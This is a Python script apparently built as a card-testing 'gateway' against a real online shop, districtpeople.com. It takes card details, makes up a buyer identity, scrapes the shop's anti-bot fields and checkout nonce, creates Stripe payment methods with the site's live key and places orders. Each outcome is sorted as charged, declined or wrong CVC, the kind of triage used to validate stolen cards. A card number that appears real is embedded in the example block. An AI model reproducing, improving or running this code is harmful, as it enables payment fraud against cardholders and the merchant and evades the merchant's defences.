# Charge2.py - District People Checkout (Konte Theme AJAX + Stripe PM + WC Checkout)

import requests
import re
import json
import random
import string
import time
from urllib.parse import quote_plus
from bs4 import BeautifulSoup # To scrape dynamic fields/nonces

# --- Generation Functions (Copied from bot.py v6.17) ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))
def generate_first_name(length=7):
    first_names_list = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole", "Nicholas", "Anthony", "Heather", "Eric", "Elizabeth", "Emily", "Olivia", "Sophia", "Emma", "Ava", "Isabella", "Mia", "Abigail", "Madison", "Charlotte", "Liam", "Noah", "Jacob", "Ethan", "Alexander", "William", "Benjamin", "Lucas", "Henry"]
    return random.choice(first_names_list)
def generate_last_name(length=9):
    last_names_list = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Martin", "Jackson", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Green", "Baker", "Adams", "Nelson", "Carter"]
    return random.choice(last_names_list)
def generate_email_username(first, last, length=4):
    num = generate_random_string(length, string.digits); sep = random.choice(['.', '_', '']); return f"{first.lower()}{sep}{last.lower()}{num}"
def generate_phone(length=10):
    # US format seems expected based on snippets
    return f"{random.randint(201, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
# --- End Generation ---

def DistrictPeopleCheckout(ccx):
    """
    Attempts checkout on www.districtpeople.com.
    Includes dynamic field scraping attempt.

    Args: ccx (str): Card details "NUMBER|MM|YY|CVC".
    Returns: str: Status message.
    """
    # --- Card Parsing ---
    try:
        ccx = ccx.strip(); parts = ccx.split("|")
        if len(parts) != 4: return "Error: Invalid card format. Use NUM|MM|YY|CVC"
        n, mm, yy, cvc = parts
        if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()): return "Error: Card parts must be numeric"
        if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
        elif len(yy) != 2: return f"Error: Invalid year format: {yy}. Use YY or 20YY."
        mm = mm.zfill(2); n_no_spaces = n.replace(' ', '')
    except Exception as parse_e: return f"Error parsing card details: {parse_e}"

    # --- Session and User Data ---
    session = requests.Session()
    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    session.headers.update({'User-Agent': ua})

    first_name = generate_first_name(); last_name = generate_last_name()
    email_user_part = generate_email_username(first_name, last_name)
    email_domain = random.choice(["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"])
    email = f"{email_user_part}@{email_domain}"
    full_name = f"{first_name} {last_name}"
    phone = generate_phone()

    # Use US Address from snippets
    street = "Street 27"; city = "New York"; state = "NY"; postal_code = "10080"; country = "US"

    # Product and Site Info
    product_id = '3913' # From snippet
    product_page_url = 'https://www.districtpeople.com/product/dc-p-chain-001/'
    ajax_url = 'https://www.districtpeople.com/'
    checkout_url = 'https://www.districtpeople.com/checkout/'
    stripe_pk = 'pk_live_51GnKXKAE5BU94NheTgdqLHmAb6wYw7FDNe3ZoER4MFPck1S9wK3DREOyfSAorTIyCEOR3joRA4ol6DnH8nJq2t1j00s0BbvFsv'
    stripe_account = 'acct_1GnKXKAE5BU94Nhe'

    # --- Dictionary to hold dynamic/scraped fields ---
    dynamic_fields = {
        'EoIGWsZzlaC_uKr': 'Fdj@o9[p1XgmP8]', # Default static value from snippet
        'AXpYcDvIU': '.WTzR_6QID',          # Default static value from snippet
        'GkpizwQoVI_': '*gseld'             # Default static value from snippet
    }

    try:
        # --- Step 0: Visit Product Page & Scrape Dynamic Fields ---
        visit_headers = { 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'upgrade-insecure-requests': '1' }
        try:
            r_visit = session.get(product_page_url, headers=visit_headers, timeout=20)
            r_visit.raise_for_status()
            soup = BeautifulSoup(r_visit.text, 'lxml')
            # Try to find the hidden fields by name
            for field_name in dynamic_fields.keys():
                input_tag = soup.find('input', {'type': 'hidden', 'name': field_name})
                if input_tag and input_tag.get('value'):
                    dynamic_fields[field_name] = input_tag['value']
            time.sleep(random.uniform(0.5, 1.2)) # Small delay
        except requests.exceptions.RequestException as e: return f"Error: Step 0 Failed - Visit product page: {e}"

        # --- Step 1: Add Product to Cart (Theme AJAX) ---
        add_cart_headers = {
            'authority': 'www.districtpeople.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
            # 'content-type' will be set by requests for multipart
            'origin': 'https://www.districtpeople.com', 'referer': product_page_url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"', 'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin', 'x-requested-with': 'XMLHttpRequest', 'user-agent': ua,
        }
        add_cart_params = { 'wc-ajax': 'konte_ajax_add_to_cart' }
        # Build multipart data using potentially scraped dynamic fields
        add_cart_files_data = {
            'quantity': (None, '1'),
            'konte-add-to-cart': (None, product_id),
            **{name: (None, value) for name, value in dynamic_fields.items()} # Add dynamic fields
        }
        try:
            r_cart = session.post(ajax_url, params=add_cart_params, headers=add_cart_headers, files=add_cart_files_data, timeout=15)
            if r_cart.status_code == 403: return "Error: Step 1 Failed - Add to Cart Blocked (403)"
            r_cart.raise_for_status()
            # Basic check on response
        except requests.exceptions.RequestException as e: return f"Error: Step 1 Failed - Add to Cart AJAX: {e}"
        except Exception as e: return f"Error: Step 1 Failed - Add to Cart Processing: {e}"

        # --- Step 2: Fetch Checkout Page for Nonce ---
        checkout_nonce = None
        get_checkout_headers = { 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'referer': product_page_url, 'upgrade-insecure-requests': '1', }
        try:
            response_get_checkout = session.get(checkout_url, headers=get_checkout_headers, timeout=20)
            response_get_checkout.raise_for_status()
            soup = BeautifulSoup(response_get_checkout.text, 'lxml')
            nonce_input = soup.find('input', {'id': 'woocommerce-process-checkout-nonce'}) or soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
            if nonce_input and nonce_input.get('value'): 
                checkout_nonce = nonce_input['value']
            else: # Regex fallback
                nonce_match = re.search(r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\'](\w+)["\']', response_get_checkout.text)
                if nonce_match: 
                    checkout_nonce = nonce_match.group(1)
            if not checkout_nonce:
                return "Error: Step 2 Failed - Checkout nonce not found."
            time.sleep(random.uniform(0.6, 1.2))
        except requests.exceptions.RequestException as e: return f"Error: Step 2 Failed - Fetching Checkout page: {e}"
        except Exception as e: return f"Error: Step 2 Failed - Parsing Checkout page: {e}"

        # --- Step 3: Create Stripe Payment Method ---
        pm_url = 'https://api.stripe.com/v1/payment_methods'
        pm_headers = { 'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua, }
        guid_s = f'guid_{generate_random_string(32)}'; muid_s = session.cookies.get('__stripe_mid', f'mid_{generate_random_string(32)}'); sid_s = session.cookies.get('__stripe_sid', f'sid_{generate_random_string(32)}')
        pm_data_dict = {
            'type': 'card',
            'billing_details[name]': full_name,
            'billing_details[address][city]': city,
            'billing_details[address][country]': country,
            'billing_details[address][line1]': street,
            'billing_details[address][postal_code]': postal_code,
            'billing_details[address][state]': state,
            'billing_details[email]': email,
            'billing_details[phone]': phone,
            'card[number]': n_no_spaces,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': guid_s, 'muid': muid_s, 'sid': sid_s,
            'payment_user_agent': 'stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; card-element', # from snippet
            'referrer': quote_plus('https://www.districtpeople.com'), # from snippet
            'time_on_page': random.randint(15000, 45000), # Random time
            'key': stripe_pk,
            '_stripe_account': stripe_account, # Stripe Connect Account
            '_stripe_version': '2022-08-01' # from snippet
        }
        pm_data_encoded = '&'.join([f"{key}={quote_plus(str(value))}" for key, value in pm_data_dict.items()])
        pm_id = None
        try:
            response_pm = session.post(pm_url, headers=pm_headers, data=pm_data_encoded, timeout=25)
            if response_pm.status_code == 402: # Handle declines directly
                 try:
                     msg = response_pm.json().get('error', {}).get('message', "Stripe Error: Card declined (402)")
                     msg_lower = msg.lower()
                     if 'insufficient_funds' in msg_lower: return "Insufficient funds."
                     if 'incorrect_cvc' in msg_lower or 'invalid_cvc' in msg_lower: return "Your card's security code is incorrect."
                     if 'expired_card' in msg_lower: return "Your card has expired."
                     if 'postal_code' in msg_lower: return "Declined (AVS - Postal Code)"
                     if 'address' in msg_lower: return "Declined (AVS - Address)" # General address check
                     if 'card was declined' in msg_lower or 'generic_decline' in msg_lower: return "Your card was declined."
                     return f"Declined ({msg})"
                 except Exception: return "Error: Stripe card declined (HTTP 402 - Non-JSON Response)"
            response_pm.raise_for_status()
            pm_json = response_pm.json(); pm_id = pm_json.get('id')
            if not pm_id: err_msg = pm_json.get('error', {}).get('message', 'PM ID missing'); return f"Error: Step 3 Failed - {err_msg}"
        except requests.exceptions.RequestException as e: return f"Error: Step 3 Failed - Stripe PM network request: {e}"
        except json.JSONDecodeError: return f"Error: Step 3 Failed - Decoding Stripe PM JSON response"
        except Exception as e: return f"Error: Step 3 Failed - Creating Stripe PM: {e}"

        # --- Step 4: Process Checkout ---
        checkout_ajax_url = 'https://www.districtpeople.com/'
        checkout_headers = { 'authority': 'www.districtpeople.com', 'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.districtpeople.com', 'referer': checkout_url, 'x-requested-with': 'XMLHttpRequest', 'user-agent': ua, }
        checkout_params = { 'wc-ajax': 'checkout' }
        checkout_data_dict = {
            # Attribution (simplified)
            'wc_order_attribution_source_type': 'typein', 'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_source': '(direct)', 'wc_order_attribution_user_agent': ua,
            # Billing
            'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': country,
            'billing_address_1': street, 'billing_city': city, 'billing_state': state,
            'billing_postcode': postal_code, 'billing_phone': phone, 'billing_email': email,
            # Shipping (assuming same as billing)
            'shipping_first_name': first_name, 'shipping_last_name': last_name, 'shipping_country': country,
            'shipping_address_1': street, 'shipping_city': city, 'shipping_state': state, 'shipping_postcode': postal_code,
            # Order Details
            'order_comments': '', 'shipping_method[0]': 'flat_rate:10', # From snippet, might need update
            'lang': 'en',
            # Payment Details
            'payment_method': 'stripe_cc', # Specific method from snippet
            'stripe_cc_token_key': pm_id, # Pass the created PM ID here!
            # Other Stripe fields often empty unless using Apple/Google Pay
            'stripe_applepay_token_key': '', 'stripe_applepay_payment_intent_key': '',
            'stripe_cc_payment_intent_key': '', # Usually empty for PM flow initially
            'stripe_googlepay_token_key': '', 'stripe_googlepay_payment_intent_key': '',
            # Terms & Nonce
            'terms': 'on', 'terms-field': '1',
            'woocommerce-process-checkout-nonce': checkout_nonce,
            '_wp_http_referer': '/?wc-ajax=update_order_review',
             # Include dynamic/anti-bot fields again, using potentially scraped values
            **dynamic_fields # Unpack the dict here
        }
        # Add PixelYourSite fields if needed (from snippet, optional)
        checkout_data_dict.update({'pys_source': 'direct', 'pys_landing': 'https://www.districtpeople.com/'})
        # Encode final payload
        checkout_data_encoded = '&'.join([f"{key}={quote_plus(str(value))}" for key, value in checkout_data_dict.items()])

        try:
            response_checkout = session.post(checkout_ajax_url, params=checkout_params, headers=checkout_headers, data=checkout_data_encoded, timeout=35)
            # Parse final response (should be JSON)
            try:
                result = response_checkout.json()
                if result.get('result') == 'success':
                    redirect_url = result.get('redirect', '')
                    if any(kw in redirect_url.lower() for kw in ["confirm", "_secret", "verify", "authenticate", "challenge", "three_d_secure"]): return "3DS/Action Required"
                    return "Charged" # Simple success message
                elif result.get('result') == 'failure':
                    messages_html = result.get('messages', '')
                    messages_text = re.sub('<[^>]+>', ' ', messages_html).strip().replace('\n', ' ').lower()
                    if 'invalid payment method' in messages_text: return "Declined (Invalid Payment Method - PM Issue?)"
                    if 'session expired' in messages_text: return "Declined (Session Expired)"
                    if 'nonce incorrect' in messages_text or 'nonce validation failed' in messages_text: return "Declined (Invalid Nonce)"
                    # Parse Stripe errors from message
                    if 'insufficient funds' in messages_text: return "Insufficient funds."
                    if 'incorrect card number' in messages_text: return "Your card number is incorrect."
                    if 'security code is incorrect' in messages_text or 'invalid cvc' in messages_text: return "Your card's security code is incorrect."
                    if 'card has expired' in messages_text: return "Your card has expired."
                    if 'postal code is invalid' in messages_text: return "Declined (AVS - Postal Code)"
                    if 'address is invalid' in messages_text: return "Declined (AVS - Address)"
                    if 'card was declined' in messages_text: return "Your card was declined."
                    if messages_text: return f"Declined ({messages_text[:100]}{'...' if len(messages_text)>100 else ''})"
                    else: return "Declined (Checkout Failed, Reason Unknown)"
                else: return f"Unknown Checkout JSON Response: {str(result)[:150]}..."
            except json.JSONDecodeError: # Handle non-JSON response
                html_text = response_checkout.text.lower()
                if 'order received' in html_text or 'thank you' in html_text: return "Charged (HTML Success Page)"
                return f"Non-JSON Checkout Response (Status {response_checkout.status_code}): {response_checkout.text[:100]}..."
        except requests.exceptions.Timeout: return "Error: Step 4 Failed - Timeout during Checkout"
        except requests.exceptions.RequestException as e: status = getattr(e.response, 'status_code', None); return f"Error: Step 4 Failed - Network error during Checkout (HTTP {status or 'N/A'})"
        except Exception as e: return f"Error: Step 4 Failed - Unexpected error during Checkout: {e}"

    # --- Global Exception Catcher ---
    except Exception as e:
        import traceback; print(f"Unexpected error in DistrictPeopleCheckout: {e}"); traceback.print_exc()
        return f"Error: Unexpected critical gateway error: {str(e)}"

# --- Example Usage Block ---
if __name__ == "__main__":
    test_cc = "5598880397646656|06|31|677" # <<< PUT A VALID TEST CARD HERE
    if "TEST_CARD_HERE" in test_cc: print("Please replace 'VISA_OR_MC_TEST_CARD_HERE' with an actual card number for testing.")
    else: print(f"Attempting checkout for: {test_cc.split('|')[0][:4]}********"); result = DistrictPeopleCheckout(test_cc); print("\n--- Checkout Result (DistrictPeople v1.0) ---"); print(result); print("--- End of Result ---")